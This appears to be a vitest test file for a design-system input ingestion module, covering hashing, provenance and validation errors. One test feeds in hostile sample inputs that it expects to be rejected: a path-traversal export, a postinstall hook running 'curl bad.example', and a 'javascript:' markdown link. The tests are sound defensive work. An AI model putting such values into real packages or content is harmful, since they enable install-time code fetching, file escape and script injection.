import { createHash } from 'node:crypto';
import { describe, expect, it } from 'vitest';

import {
  DesignInputValidationError,
  ingestDesignInputs,
  loadDesignContext,
  type DesignInputPort,
  type ResolvedDesignLanguage,
  type ResolvedDesignPackage
} from './index';

const markdown = '# Example Design Language\n\n## Principles\n\nUse semantic tokens.';

function packageArtifact(overrides: Record<string, unknown> = {}): ResolvedDesignPackage {
  const packageJson = {
    name: '@selene/example-design-library',
    version: '1.0.0',
    peerDependencies: { react: '^19.0.0' },
    exports: { '.': './dist/index.js', './tokens': './dist/tokens.json' },
    selene: {
      designSystem: {
        schemaVersion: '1',
        tokenFiles: ['./dist/tokens.json'],
        components: [{ name: 'Button', exportName: 'Button', entrypoint: '.' }],
        designLanguagePath: './DESIGN.md'
      }
    },
    ...overrides
  };
  return {
    packageJson,
    files: [
      { path: './dist/index.js', content: 'export const Button = {};' },
      { path: './dist/tokens.json', content: '{"color":"blue"}' },
      { path: './DESIGN.md', content: markdown }
    ],
    provenance: { provider: 'test-registry', location: 'npm:@selene/example-design-library@1.0.0' }
  };
}

function languageArtifact(value = markdown): ResolvedDesignLanguage {
  return {
    markdown: value,
    provenance: {
      provider: 'test-registry',
      location: 'npm:@selene/example-design-library@1.0.0/DESIGN.md'
    }
  };
}

const request = {
  package: { name: '@selene/example-design-library', version: '1.0.0' },
  designLanguage: { location: 'design-language:example' },
  requiredPeerDependencies: { react: '^19.0.0' }
};

const integrity = {
  async sha256(value: string) {
    return createHash('sha256').update(value).digest('hex');
  }
};

async function expectIssue(
  packageValue: ResolvedDesignPackage,
  languageValue: ResolvedDesignLanguage,
  code: string
): Promise<void> {
  await expect(
    ingestDesignInputs(request, packageValue, languageValue, integrity)
  ).rejects.toMatchObject({
    issues: [expect.objectContaining({ code })]
  });
}

describe('design input ingestion', () => {
  it('creates deterministic data-only context with hashes and provenance', async () => {
    const hashCheckedRequest = {
      ...request,
      designLanguage: {
        ...request.designLanguage,
        expectedSha256: '77443c9cd0060a8b59e8563868333780833075f3172419902276d52e407ac355'
      }
    };
    const first = await ingestDesignInputs(
      hashCheckedRequest,
      packageArtifact(),
      languageArtifact(),
      integrity
    );
    const second = await ingestDesignInputs(
      request,
      packageArtifact(),
      languageArtifact(),
      integrity
    );

    expect(first).toEqual(second);
    expect(first.format).toBe('selene-design-context/v1');
    expect(first.records).toHaveLength(5);
    expect(first.records.every((record) => /^[a-f0-9]{64}$/.test(record.sha256))).toBe(true);
    expect(first.language.sections.map((section) => section.heading)).toEqual([
      'Example Design Language',
      'Principles'
    ]);
  });

  it('uses a host port without giving the core package filesystem or installer behavior', async () => {
    const port: DesignInputPort = {
      resolvePackage: async () => packageArtifact(),
      readDesignLanguage: async () => languageArtifact(),
      sha256: integrity.sha256
    };
    await expect(loadDesignContext(port, request)).resolves.toMatchObject({
      library: { name: '@selene/example-design-library' }
    });
  });

  it('rejects malformed and unavailable host digests without exposing a partial context', async () => {
    const invalidDigest = { sha256: async () => 'not-a-sha256' };
    const unavailableDigest = {
      sha256: async () => Promise.reject(new Error('integrity provider unavailable'))
    };
    await Promise.all(
      [invalidDigest, unavailableDigest].map((substitute) =>
        expect(
          ingestDesignInputs(request, packageArtifact(), languageArtifact(), substitute)
        ).rejects.toBeInstanceOf(DesignInputValidationError)
      )
    );
  });

  it('rejects missing declared artifacts', async () => {
    const artifact = packageArtifact();
    await expectIssue(
      { ...artifact, files: artifact.files.filter((file) => file.path !== './dist/tokens.json') },
      languageArtifact(),
      'missing-input'
    );
  });

  it('rejects malformed package metadata and markdown', async () => {
    await expectIssue(
      packageArtifact({ version: 'latest' }),
      languageArtifact(),
      'malformed-package'
    );
    await expectIssue(
      packageArtifact(),
      languageArtifact('just prose without a heading'),
      'malformed-markdown'
    );
  });

  it('rejects incompatible requested package and peer dependency ranges', async () => {
    await expectIssue(
      packageArtifact({ version: '2.0.0' }),
      languageArtifact(),
      'incompatible-input'
    );
    await expectIssue(
      packageArtifact({ peerDependencies: { react: '^18.0.0' } }),
      languageArtifact(),
      'incompatible-input'
    );
  });

  it('rejects path traversal, lifecycle hooks, and executable markdown', async () => {
    await expectIssue(
      packageArtifact({ exports: { '.': '../outside.js' } }),
      languageArtifact(),
      'unsafe-input'
    );
    await expectIssue(
      packageArtifact({ scripts: { postinstall: 'curl bad.example' } }),
      languageArtifact(),
      'unsafe-input'
    );
    await expectIssue(
      packageArtifact(),
      languageArtifact('# Safe?\n\n[x](javascript:alert(1))'),
      'unsafe-input'
    );
  });
});
